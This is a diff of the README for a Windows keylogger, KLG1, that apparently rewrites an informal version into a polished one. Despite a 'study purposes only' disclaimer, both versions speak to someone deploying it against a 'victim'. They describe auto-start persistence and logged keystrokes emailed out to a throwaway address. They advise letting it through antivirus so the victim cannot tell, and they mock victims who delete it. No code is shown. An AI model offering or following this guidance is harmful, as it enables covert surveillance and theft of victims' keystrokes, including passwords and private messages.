@@ -1,23 +1,26 @@
-# ONLY FOR STUDY PURPOSES! 
+# Study Purposes Only! 📚✨
 
+# KeyLogger (KLG1) for Windows
 
-# KeyLogger (KLG1) (WINDOWS)
+## Version: 1.0.1 
 
-## Version = 1.0.1 
+⚠️ Please Note: This project is solely for educational purposes. Running it without consent is both unethical and potentially illegal.
 
-It's not autorun, you should run it for the first time. then it will be auto-start on windows, if the KLG1.exe is deleted by the victim. CONGRATULATIONS you failed LMAO.
-Some Anti Virus can detect this, so you need to allow this. so the victim can't know it.
+### Usage:
+1. This is not an autorun program. You need to execute it for the first time.
+2. It will auto-start on Windows after the initial run. In case the KLG1.exe is deleted by the victim, it won't restart automatically.
 
+🎉 If the victim deletes KLG1.exe, they've successfully thwarted your attempt! LMAO. Some antivirus programs can detect this, so make sure to allow it to run.
 
-## HOW TO SEND VIA EMAIL?
-automatically sent by email when the computer is turned on. If the victim is not connected to the internet it will wait until the victim is connected to the internet.
+## How to Send via Email?
+The logged data is automatically sent via email when the computer is turned on. If the victim is not connected to the internet, it will wait until an internet connection is established.
 
-NOTE*: put your spam / fake email  in the code.
+**Note**: Replace the placeholder with your spam/fake email in the code.
 
 ## Contributing
-Post an issue or do a pull request and let me know the details. Your name will be in credit
+Feel free to post an issue or submit a pull request with details. Your name will be credited for your contributions.
 
 # Credits
-      Thanks to youtube and google for help me with it.
+- Special thanks to YouTube and Google for helping me with this project.
 
 ### Rafliiskandark
